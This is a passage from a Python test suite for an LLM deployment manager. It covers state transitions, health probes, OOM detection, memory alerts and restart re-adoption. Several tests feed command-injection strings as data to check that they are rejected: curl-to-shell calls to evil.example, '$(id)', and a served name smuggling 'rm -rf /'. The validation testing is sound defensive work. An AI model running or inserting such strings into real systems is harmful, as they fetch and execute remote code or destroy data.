    assert command_block.index("whatever-i-want") < command_block.index(
        "--served-model-name {served_model_name}"
    )
    assert "--host {host}" in command_block
    assert "--port {port}" in command_block


@pytest.mark.parametrize(
    "token",
    [
        "--foo;curl http://evil.example|sh",
        "--foo$(id)",
        "with a space",
        "",
    ],
)
def test_unsafe_custom_command_tokens_are_rejected(tmp_path, token):
    with pytest.raises(ValueError, match="custom_command"):
        synthesize(
            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
            custom_command=(token,),
        )
    assert list(tmp_path.glob("*.yaml")) == []


def test_extra_args_and_custom_command_together_is_rejected(tmp_path):
    """The two mean different things -- append versus replace -- and a
    request cannot mean both, so synthesize refuses rather than picking one
    silently."""
    with pytest.raises(ValueError, match="mutually exclusive"):
        synthesize(
            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
            extra_args=("--quantization", "modelopt_fp4"),
            custom_command=("--gpu-memory-utilization", "0.5"),
        )
    assert list(tmp_path.glob("*.yaml")) == []


# ==========================================================================
# Acceptance: M-22's identifier check gates DeploymentManager.launch()
# synchronously -- before any record or worker thread exists -- not only
# synthesize() on the async launch worker's thread.
# ==========================================================================


def test_launch_refuses_a_hostile_model_id_before_creating_any_record(tmp_path):
    import dataclasses

    manager = make_manager(tmp_path)
    hostile = dataclasses.replace(
        fx.GPT_OSS_120B,
        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
    )
    with pytest.raises(ValueError, match="model_id"):
        manager.launch(hostile, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    # Refused synchronously: no LAUNCHING record was ever created for the
    # async launch worker to later flip to FAILED.
    assert manager.list() == []
    manager.close()


def test_launch_refuses_a_hostile_served_name_before_creating_any_record(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(ValueError, match="served_name"):
        manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
            served_name="name\ncommand: |\n  rm -rf /",
        )
    assert manager.list() == []
    manager.close()


def test_launch_accepts_a_local_path_model_id(tmp_path):
    """The other direction, through the same synchronous gate: a local-path
    model_id (see test_local_path_model_ids_still_synthesize) must still be
    launchable, not just still synthesizable."""
    import dataclasses

    manager = make_manager(tmp_path)
    local = dataclasses.replace(fx.GPT_OSS_120B, model_id=str(tmp_path / "local-model"))
    deployment = manager.launch(local, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert deployment.state is S.LAUNCHING
    manager.close()


def test_launch_refuses_unsafe_extra_args_before_creating_any_record(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(ValueError, match="extra_args"):
        manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
            extra_args=("--foo;curl http://evil.example|sh",),
        )
    assert manager.list() == []
    manager.close()


def test_launch_stores_safe_extra_args_on_the_deployment(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(
        fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
        extra_args=("--quantization", "modelopt_fp4"),
    )
    assert deployment.state is S.LAUNCHING
    assert deployment.extra_args == ("--quantization", "modelopt_fp4")
    manager.close()


def test_launch_refuses_unsafe_custom_command_before_creating_any_record(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(ValueError, match="custom_command"):
        manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
            custom_command=("--foo;curl http://evil.example|sh",),
        )
    assert manager.list() == []
    manager.close()


def test_launch_refuses_extra_args_and_custom_command_together(tmp_path):
    manager = make_manager(tmp_path)
    with pytest.raises(ValueError, match="mutually exclusive"):
        manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
            extra_args=("--quantization", "modelopt_fp4"),
            custom_command=("--gpu-memory-utilization", "0.5"),
        )
    assert manager.list() == []
    manager.close()


def test_launch_stores_a_safe_custom_command_on_the_deployment(tmp_path):
    manager = make_manager(tmp_path)
    deployment = manager.launch(
        fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
        custom_command=("--gpu-memory-utilization", "0.5"),
    )
    assert deployment.state is S.LAUNCHING
    assert deployment.custom_command == ("--gpu-memory-utilization", "0.5")
    manager.close()


# ==========================================================================
# Acceptance: an illegal state transition raises rather than silently
# correcting.
# ==========================================================================


def test_illegal_transition_raises(tmp_path):
    manager = make_manager(tmp_path)
    probe = manager._probe
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.stop(deployment.deployment_id)
    assert manager.get(deployment.deployment_id).state is S.STOPPED

    record = manager._records[deployment.deployment_id]
    with pytest.raises(IllegalTransition) as excinfo:
        manager._transition(record, S.READY)
    assert "stopped -> ready" in str(excinfo.value)
    # And it did not quietly change anyway.
    assert manager.get(deployment.deployment_id).state is S.STOPPED
    manager.close()


def test_fsm_matches_the_architecture_diagram():
    assert LEGAL[S.PLANNED] == frozenset({S.LAUNCHING})
    assert LEGAL[S.LAUNCHING] == frozenset({S.READY, S.FAILED})
    assert LEGAL[S.READY] == frozenset({S.DEGRADED, S.FAILED, S.STOPPING})
    assert LEGAL[S.DEGRADED] == frozenset({S.READY, S.FAILED, S.STOPPING})
    assert LEGAL[S.STOPPING] == frozenset({S.STOPPED})
    assert LEGAL[S.FAILED] == frozenset()
    assert LEGAL[S.STOPPED] == frozenset()
    assert SERVING == frozenset({S.READY, S.DEGRADED})
    assert TERMINAL == frozenset({S.FAILED, S.STOPPED})


def test_every_state_is_reachable_from_planned():
    seen, frontier = {S.PLANNED}, [S.PLANNED]
    while frontier:
        for nxt in LEGAL[frontier.pop()]:
            if nxt not in seen:
                seen.add(nxt)
                frontier.append(nxt)
    assert seen == set(S)


# ==========================================================================
# Acceptance: a deployment reaching READY exposes a backend URL that answers
# /health.
# ==========================================================================


def test_ready_exposes_a_backend_url_that_answers_health(tmp_path):
    probe = FakeProbe()
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)

    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    live = manager.get(deployment.deployment_id)
    assert live.backend_url == "http://%s:8100/v1" % fx.SPARK_01.address
    assert live.started_at is not None
    assert probe(live.backend_url)[0] is True
    manager.close()


def test_backend_origin_strips_the_v1_suffix():
    assert backend_origin("http://h:8100/v1") == "http://h:8100"
    assert backend_origin("http://h:8100/") == "http://h:8100"
    assert backend_origin("http://h:8100") == "http://h:8100"


def test_health_probe_hits_the_origin_not_the_v1_base(tmp_path):
    """vLLM and SGLang both serve /health at the origin, not under /v1."""
    import http.server
    import threading as _t

    seen: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            seen.append(self.path)
            self.send_response(200 if self.path == "/health" else 404)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *a):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    _t.Thread(target=server.serve_forever, daemon=True).start()
    try:
        from control_plane.deploy.health import probe as real_probe

        url = "http://127.0.0.1:%d/v1" % server.server_port
        healthy, reason = real_probe(url, timeout=2.0)
        assert healthy is True and reason is None
        assert seen == ["/health"]
    finally:
        server.shutdown()


# ==========================================================================
# Acceptance: killing a backend moves the deployment to FAILED within 15
# seconds with a useful last_error.
# ==========================================================================


def test_killing_a_backend_fails_the_deployment_with_a_useful_error(tmp_path):
    probe = FakeProbe()
    manager = make_manager(tmp_path, probe=probe, poll_interval_s=0.01)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    manager.adapter.log_tail = "ERROR ... torch.OutOfMemoryError: CUDA out of memory."
    probe.kill(deployment.backend_url)

    # Two consecutive misses is the threshold; at the real 5s poll that is
    # inside the 15 second bar.
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    manager.tick()

    live = manager.get(deployment.deployment_id)
    assert live.state is S.FAILED
    assert "stopped answering" in live.last_error
    assert live.backend_url in live.last_error

    lost = drain(manager.bus, ev.BACKEND_LOST)
    assert lost and lost[0]["deployment_id"] == deployment.deployment_id
    manager.close()


def test_death_within_the_fifteen_second_bar():
    """At the shipped poll interval, threshold misses land inside 15s.

    This is necessary but not sufficient: it assumes an instant probe. See
    test_hanging_health_endpoint_still_fails_within_fifteen_seconds below for
    the M-15 case this arithmetic alone does not cover.
    """
    from control_plane.deploy.manager import HEALTH_FAIL_THRESHOLD, POLL_INTERVAL_S

    assert POLL_INTERVAL_S * HEALTH_FAIL_THRESHOLD <= 15.0


def _start_hanging_server():
    """A real listening socket that accepts a TCP connection and then never
    writes a response, so a client using the real health.probe() genuinely
    blocks until *its own* timeout expires -- deliberately not a fake that
    resolves instantly, or a test built on it would not distinguish the fix
    from the bug. Returns (hang_port, stop_event, acceptor_thread); the
    caller must set() the event and join() the thread when done.
    """
    import socket as _socket
    import threading as _t

    server = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 0))
    server.listen(64)
    hang_port = server.getsockname()[1]
    stop_accepting = _t.Event()

    def accept_and_hang():
        while not stop_accepting.is_set():
            server.settimeout(0.1)
            try:
                conn, _ = server.accept()
            except OSError:
                continue
            conn.settimeout(60.0)  # hold it open; never write a response

    acceptor = _t.Thread(target=accept_and_hang, daemon=True)
    acceptor.start()
    return hang_port, stop_accepting, acceptor, server


def test_hanging_health_endpoint_still_fails_within_fifteen_seconds(tmp_path):
    """M-15: a HANGING health endpoint (not a fast refusal) costs up to
    ~6s per probe at the default per-path timeout -- two consecutive misses
    would then run ~22s worst case, blowing the 15s acceptance bar even
    though test_death_within_the_fifteen_second_bar's arithmetic looks fine.
    The manager must derive a tighter per-path probe timeout from the poll
    cycle so the wall-clock bound holds even when every probe hangs.

    The clock starts *before* the leading poll interval the real watch loop
    always pays first -- _watch_loop ticks, then waits poll_interval_s, then
    ticks again, so the true worst case (from the instant a healthy backend
    goes silent) is poll_interval_s + probe_time, twice, not just the second
    half of that. Starting the clock only at the first tick call understates
    the real bound by one full poll_interval_s.
    """
    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
    from control_plane.deploy.health import probe as real_probe

    hanging = {"on": False}

    def probe_fn(backend_url, timeout=3.0, expect_model=None):
        if not hanging["on"]:
            return True, None
        # Real socket connect + read against the hanging server above,
        # bounded only by *timeout* -- exercises the same code path
        # health.probe() uses, with the manager's derived timeout forwarded.
        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)

    try:
        manager = make_manager(tmp_path, probe=probe_fn)
        deployment = manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
        )
        assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

        hanging["on"] = True
        start = time.monotonic()
        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
        manager.tick()
        assert manager.get(deployment.deployment_id).state is S.READY  # one miss so far
        time.sleep(manager.poll_interval_s)
        manager.tick()
        elapsed = time.monotonic() - start

        live = manager.get(deployment.deployment_id)
        assert live.state is S.FAILED, live.last_error
        assert elapsed <= 15.0, "hanging probe blew the 15s death bound: %.1fs" % elapsed
        manager.close()
    finally:
        stop_accepting.set()
        acceptor.join(timeout=2.0)
        server.close()


def test_hanging_health_endpoints_still_fail_within_fifteen_seconds_at_scale(tmp_path):
    """M-15, the compounding half the single-deployment test above cannot
    exercise: an earlier fix derived the per-path timeout as
    budget_per_tick / watched_count / len(HEALTH_PATHS), floored by
    MIN_PROBE_TIMEOUT_S. Past watched_count = budget_per_tick /
    MIN_PROBE_TIMEOUT_S (6, at the shipped constants) the floor won and the
    *serial* total across all watched deployments grew unboundedly with
    watched_count instead of staying flat -- 16s at 6 deployments, 30s at
    20, worse than the ~22s the original bug produced. tick() must probe
    every deployment's backend concurrently so the wall-clock cost of a tick
    stays roughly constant as watched_count grows past that point. Eight
    deployments, all hanging on the same real socket at once, is comfortably
    past the n=6 threshold where the old arithmetic broke.
    """
    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
    from control_plane.deploy.health import probe as real_probe

    hanging = {"on": False}

    def probe_fn(backend_url, timeout=3.0, expect_model=None):
        if not hanging["on"]:
            return True, None
        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)

    try:
        manager = make_manager(tmp_path, probe=probe_fn)
        # Eight distinct models, not one model under eight names: a node runs
        # one copy of a model, and the point here is eight *watched* backends
        # rather than eight copies of anything.
        deployments = [
            manager.launch(
                dataclasses.replace(
                    fx.GPT_OSS_120B, model_id="openai/gpt-oss-120b-%d" % i
                ),
                fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
                served_name="model-%d" % i,
            )
            for i in range(8)
        ]
        for d in deployments:
            assert wait_for(
                lambda d=d: manager.get(d.deployment_id).state is S.READY
            )

        hanging["on"] = True
        start = time.monotonic()
        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
        manager.tick()
        for d in deployments:
            assert manager.get(d.deployment_id).state is S.READY  # one miss so far
        time.sleep(manager.poll_interval_s)
        manager.tick()
        elapsed = time.monotonic() - start

        for d in deployments:
            live = manager.get(d.deployment_id)
            assert live.state is S.FAILED, live.last_error
        assert elapsed <= 15.0, (
            "hanging probes across 8 watched deployments blew the 15s "
            "death bound: %.1fs" % elapsed
        )
        manager.close()
    finally:
        stop_accepting.set()
        acceptor.join(timeout=2.0)
        server.close()


def test_backend_dying_during_startup_fails_the_launch(tmp_path):
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    # The container disappears while the model is still loading.
    assert wait_for(lambda: manager.adapter.running)
    manager.adapter.running.clear()

    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.FAILED)
    assert "exited during startup" in manager.get(deployment.deployment_id).last_error
    manager.close()


def test_an_unanswering_check_job_does_not_instantly_fail_a_launch(tmp_path):
    """M-16: check-job returning unknown (e.g. it timed out on a wedged
    host) must not be read as "not running" -- that would kill a launch
    that may still be loading, exactly like test_backend_dying_during_
    startup_fails_the_launch above but for a host that never actually died.
    """
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    probe = FakeProbe(healthy_by_default=False)  # backend not answering yet
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.adapter.running)
    cluster_id = next(iter(adapter.running))
    adapter.unknown.add(cluster_id)  # check-job now times out for this cluster

    # Several ready-poll cycles all coming back "unknown": still LAUNCHING.
    time.sleep(0.05)
    assert manager.get(deployment.deployment_id).state is S.LAUNCHING

    # The host answers again and the backend finishes loading: it recovers,
    # proving the waiter kept going rather than having declared it dead.
    adapter.unknown.discard(cluster_id)
    probe.healthy_by_default = True
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
    manager.close()


def test_launch_failure_preserves_raw_sparkrun_output(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(
        registry,
        recipe_dir=tmp_path / "recipes",
        fail_with=LaunchError(
            "sparkrun exited 0 but printed no cluster id; cannot track this workload",
            raw="sparkrun v0.2.40\nsomething unparseable happened\n",
        ),
    )
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.FAILED)
    error = manager.get(deployment.deployment_id).last_error
    assert "no cluster id" in error
    assert "something unparseable happened" in error
    manager.close()


def test_oom_signature_detection():
    assert is_oom("torch.OutOfMemoryError: CUDA out of memory. Tried to allocate")
    assert is_oom("Memory cgroup out of memory: Killed process 1234 (python)")
    assert is_oom("No available memory for the cache blocks")
    assert not is_oom("ValueError: unsupported dtype")


# ==========================================================================
# The calibration event: an OOM despite passing the fit gate.
# ==========================================================================


def test_oom_after_passing_the_fit_gate_emits_the_full_breakdown(tmp_path):
    """The most valuable telemetry the system produces. Agent D's estimate
    was low; the event carries the prediction next to the actual failure."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(
        registry,
        recipe_dir=tmp_path / "recipes",
        fail_with=LaunchError(
            "sparkrun exited 1",
            raw="torch.OutOfMemoryError: CUDA out of memory.",
            oom=True,
        ),
    )
    manager = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    fit = fx.fits()
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fit, "vllm", 65536, 256)
    assert wait_for(lambda: drain(manager.bus, ev.FIT_MISS))

    miss = drain(manager.bus, ev.FIT_MISS)[0]
    assert miss["deployment_id"] == deployment.deployment_id
    assert miss["predicted_verdict"] == fit.verdict.value
    assert miss["predicted_reason"] == fit.reason
    assert miss["predicted_total"] == fit.breakdown.total
    assert miss["usable_per_node"] == fit.usable_per_node
    assert miss["predicted_breakdown"]["weights"] == fit.breakdown.weights
    assert miss["predicted_breakdown"]["kv_cache"] == fit.breakdown.kv_cache
    assert "out of memory" in miss["actual_error"].lower()
    assert miss["plan"]["pipeline_parallel"] == 2
    assert miss["context_length"] == 65536
    manager.close()


# ==========================================================================
# Acceptance: crossing 95 percent memory emits a critical event that Agent G
# receives. And we shed, we do not kill.
# ==========================================================================


def test_ninety_percent_warns_and_degrades(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-02", 92.0)
    manager.tick()

    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    warnings = drain(manager.bus, ev.MEMORY_WARNING)
    assert warnings and warnings[0]["node_id"] == "spark-02"
    assert warnings[0]["severity"] == "warning"
    # DEGRADED still serves. Agent G keeps routing; it decides admission.
    assert warnings[0]["admitting"] is True
    manager.close()


def test_ninety_five_percent_emits_critical_and_stops_admission(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.5)
    manager.tick()

    critical = drain(manager.bus, ev.MEMORY_CRITICAL)
    assert len(critical) == 1
    assert critical[0]["deployment_id"] == deployment.deployment_id
    assert critical[0]["node_id"] == "spark-01"
    assert critical[0]["severity"] == "critical"
    # This is the field Agent G reads to stop admitting.
    assert critical[0]["admitting"] is False
    assert critical[0]["memory_used_pct"] == pytest.approx(96.5, abs=0.2)

    # Shed, never kill. The workload is untouched.
    assert manager.adapter.stops == []
    assert manager.adapter.running
    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    manager.close()


def test_critical_event_reaches_an_async_subscriber(tmp_path):
    """Agent G consumes this over `async for e in manager.events()`."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    async def consume():
        received: list[dict] = []

        async def reader():
            async for event in manager.events():
                received.append(event)
                if event["type"] == ev.MEMORY_CRITICAL:
                    return

        task = asyncio.create_task(reader())
        await asyncio.sleep(0.05)  # let the subscription register
        registry.set_memory_pct("spark-01", 97.0)
        await asyncio.to_thread(manager.tick)
        await asyncio.wait_for(task, timeout=5.0)
        return received

    received = asyncio.run(consume())
    critical = [e for e in received if e["type"] == ev.MEMORY_CRITICAL]
    assert critical and critical[0]["admitting"] is False
    manager.close()


def test_pressure_clearing_returns_to_ready(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.0)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.DEGRADED

    registry.set_memory_pct("spark-01", 40.0)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    cleared = drain(manager.bus, ev.MEMORY_CLEARED)
    assert cleared and cleared[0]["admitting"] is True
    manager.close()


def test_an_unhealthy_node_degrades_the_deployment(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_healthy("spark-02", False)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.DEGRADED
    assert drain(manager.bus, ev.NODE_UNHEALTHY)

    registry.set_healthy("spark-02", True)
    manager.tick()
    assert manager.get(deployment.deployment_id).state is S.READY
    manager.close()


def test_memory_events_fire_on_change_not_every_tick(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    manager = make_manager(tmp_path, registry=registry)
    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)

    registry.set_memory_pct("spark-01", 96.0)
    for _ in range(5):
        manager.tick()
    assert len(drain(manager.bus, ev.MEMORY_CRITICAL)) == 1
    manager.close()


def test_thresholds_are_the_documented_ones():
    assert ev.MEMORY_WARN_FRACTION == 0.90
    assert ev.MEMORY_CRITICAL_FRACTION == 0.95


# ==========================================================================
# Acceptance: restarting the control plane re-adopts a still-running
# deployment rather than orphaning or duplicating it.
# ==========================================================================


def test_a_launch_with_no_handle_yet_is_unknown_not_dead(tmp_path):
    """A restart during the first seconds of a launch must not retire it.

    Observed on the live coordinator. A launch was seconds old -- sparkrun
    spawned, no cluster id recorded yet -- when the control plane was restarted.
    `_evidence` read the missing cluster id as `False` ("definitely not
    running") rather than as `None` ("could not ask"), took the FAILED branch,
    and reported:

        launch did not survive the control plane restart

    while the sparkrun process was alive and still loading its weights. The
    record was then terminal, so nothing would ever stop it: an orphan holding
    GPU memory, on a machine whose aggregate memory reads N/A and where only
    per-process accounting shows it at all.

    `SparkrunAdapter.is_running` is explicitly three-valued about exactly this
    -- "None is absence of evidence, not evidence of death" -- and the youngest
    record is the one most likely to still be starting, not the least.
    """
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    first.close()

    # Rewind that record to how it looks in the first seconds of a launch:
    # LAUNCHING, no backend url, and no cluster id in the handle.
    # DeploymentStore writes one file per deployment under state_dir/deployments.
    state_file = tmp_path / "deployments" / ("%s.json" % deployment.deployment_id)
    body = json.loads(state_file.read_text())
    body["deployment"]["state"] = "launching"
    body["deployment"]["backend_url"] = None
    body.get("handle", {}).pop("cluster_id", None)
    state_file.write_text(json.dumps(body))

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = set()  # sparkrun knows nothing about it -- there is no id to ask about
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(healthy_by_default=False),
        autostart=False,
    )
    second.reconcile()

    readopted = second.get(deployment.deployment_id)
    assert readopted.state is S.LAUNCHING, (
        "a launch with no handle yet was retired as FAILED; absence of a cluster "
        "id is absence of evidence, and the process may still be starting"
    )
    assert readopted.last_error != "launch did not survive the control plane restart"


def test_restart_readopts_a_running_deployment(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live_clusters = set(first.adapter.running)
    first.close()

    # New process. Same volume, same still-running backend.
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = live_clusters
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(), autostart=False
    )
    adopted = second.reconcile()

    assert [d.deployment_id for d in adopted] == [deployment.deployment_id]
    readopted = second.get(deployment.deployment_id)
    assert readopted.state is S.READY
    assert readopted.backend_url == deployment.backend_url
    assert readopted.plan.pipeline_parallel == 2
    assert readopted.fit.reason == deployment.fit.reason
    assert readopted.shape.model_id == fx.GPT_OSS_120B.model_id
    # Adopted, not relaunched.
    assert adapter.launches == []
    assert len(second.list()) == 1
    second.close()


def test_restart_retires_a_deployment_whose_backend_is_gone(tmp_path):
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")  # nothing running
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path,
        probe_fn=FakeProbe(healthy_by_default=False), autostart=False,
    )
    adopted = second.reconcile()

    assert adopted == []
    retired = second.get(deployment.deployment_id)
    assert retired.state is S.STOPPED
    assert "gone" in retired.last_error
    second.close()


def test_restart_adopts_a_deployment_that_is_still_loading(tmp_path):
    """Container up, backend silent: it is mid-load, not dead. Adopt it as
    LAUNCHING so the gateway does not route to it, and finish waiting."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live = set(first.adapter.running)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = live
    probe = FakeProbe(healthy_by_default=False)
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()
    assert [d.state for d in adopted] == [S.LAUNCHING]

    probe.healthy_by_default = True  # the model finishes loading
    assert wait_for(lambda: second.get(deployment.deployment_id).state is S.READY)
    assert adapter.launches == []
    second.close()


def test_reconcile_does_not_retire_a_deployment_on_a_wedged_check_job(tmp_path):
    """M-16: check_job timing out on restart is 'sparkrun could not answer',
    not 'the workload is gone'. Collapsing that TIMEOUT into `running: False`
    used to make reconcile() retire a deployment that might still be alive
    on a wedged host -- it must instead adopt it as LAUNCHING, the same
    conservative outcome as backend-silent-but-container-up above."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
    live = set(first.adapter.running)
    first.close()

    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    adapter.running = set()  # sparkrun cannot confirm a live container either
    adapter.unknown = set(live)  # ...because check-job times out on this host
    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
    second = DeploymentManager(
        adapter, registry, state_dir=tmp_path, probe_fn=probe,
        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
    )
    adopted = second.reconcile()

    assert [d.state for d in adopted] == [S.LAUNCHING]
    assert "could not confirm" in second.get(deployment.deployment_id).last_error

    probe.healthy_by_default = True  # the host answers again, model is up
    assert wait_for(lambda: second.get(deployment.deployment_id).state is S.READY)
    second.close()


def test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable(tmp_path):
    """M-16, the other check_job branch: `available()` being False (the
    sparkrun binary missing or unreachable from this process right now) is
    also 'we could not check', not 'the workload is gone'. Before this fix,
    check_job's early return hardcoded {"running": False} whenever
    available() was False, so a control plane that restarted into an
    environment temporarily missing the sparkrun binary would retire every
    live deployment it could not also confirm over HTTP -- the same failure
    mode as the wedged-check-job test above, reached through the other
    branch of check_job()."""
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    first = make_manager(tmp_path, registry=registry)
    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
